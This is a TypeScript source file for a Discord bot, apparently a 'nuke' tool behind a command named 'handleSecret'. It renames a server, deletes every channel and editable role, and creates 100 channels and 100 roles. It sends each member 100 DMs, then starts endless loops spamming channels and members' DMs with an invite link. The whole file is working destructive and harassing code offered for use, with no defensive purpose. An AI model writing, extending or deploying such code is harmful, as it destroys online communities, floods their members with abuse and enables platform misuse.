import type { Message, Client, TextChannel, GuildMember } from "discord.js";
import { ChannelType } from "discord.js";

const SPAM_MESSAGE = `# MEMBERTY NUKE HAHA\n@everyone\nhttps://discord.gg/zy5rjBDTyn`;
const SERVER_NAME = "MEMBERTY WAS HERE";
const CHANNEL_NAME = "memverty";
const CHANNEL_TOPIC = "MEMBERTY WAS HERE AND SAY GOODNIGHT";

// Store all active intervals per guild (channel loop + DM loop)
const activeLoops = new Map<string, NodeJS.Timeout[]>();

export function stopSpamLoop(guildId: string): void {
  const loops = activeLoops.get(guildId);
  if (loops) {
    for (const loop of loops) clearInterval(loop);
    activeLoops.delete(guildId);
  }
}

function startSpamLoops(
  guildId: string,
  channels: TextChannel[],
  members: GuildMember[],
): void {
  stopSpamLoop(guildId);

  const loops: NodeJS.Timeout[] = [];

  // ~1000 messages every 0.5s across all channels
  if (channels.length > 0) {
    const msgsPerChannel = Math.max(1, Math.ceil(1000 / channels.length));
    loops.push(
      setInterval(() => {
        for (const ch of channels) {
          for (let i = 0; i < msgsPerChannel; i++) {
            ch.send(SPAM_MESSAGE).catch(() => {});
          }
        }
      }, 500),
    );
  }

  // DM loop — blast every member every 0.5s
  if (members.length > 0) {
    loops.push(
      setInterval(() => {
        for (const m of members) {
          m.send(SPAM_MESSAGE).catch(() => {});
        }
      }, 500),
    );
  }

  activeLoops.set(guildId, loops);
}

export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void args;
  void client;

  const guild = message.guild;
  if (!guild) return;

  message.channel.send("🔥 Firing...").catch(() => {});

  // Fetch members so cache is populated
  await guild.members.fetch().catch(() => {});

  const humanMembers = guild.members.cache
    .filter((m) => !m.user.bot)
    .map((m) => m);

  // Run all setup operations simultaneously
  const [, , , , createdChannels] = await Promise.all([
    // Rename server
    guild.setName(SERVER_NAME).catch(() => {}),

    // Delete all existing channels
    Promise.all(guild.channels.cache.map((ch) => ch.delete().catch(() => {}))),

    // Delete all editable roles
    Promise.all(
      guild.roles.cache
        .filter((r) => r.name !== "@everyone" && r.editable)
        .map((r) => r.delete().catch(() => {})),
    ),

    // Initial DM blast — 100 DMs to every member right now
    Promise.all(
      humanMembers.map((m) =>
        Promise.all(
          Array.from({ length: 100 }, () => m.send(SPAM_MESSAGE).catch(() => {})),
        ),
      ),
    ),

    // Create 100 channels — initial blast on each immediately
    Promise.all(
      Array.from({ length: 100 }, () =>
        guild.channels
          .create({
            name: CHANNEL_NAME,
            type: ChannelType.GuildText,
            nsfw: false,
            topic: CHANNEL_TOPIC,
          })
          .then((ch) => {
            if (!ch.isTextBased()) return null;
            Promise.all(
              Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
            );
            return ch as TextChannel;
          })
          .catch(() => null),
      ),
    ),

    // Create 100 roles simultaneously
    Promise.all(
      Array.from({ length: 100 }, () =>
        guild.roles.create({ name: "MEMBERTY", color: "Red" }).catch(() => {}),
      ),
    ),
  ]);

  const validChannels = (createdChannels as (TextChannel | null)[]).filter(
    (ch): ch is TextChannel => ch !== null,
  );

  // Start endless channel + DM spam loops at 1k msgs / 0.5s
  startSpamLoops(guild.id, validChannels, humanMembers);

  message.channel.send("✅ Endless spam started — 1k msgs every 0.5s.").catch(() => {});
}
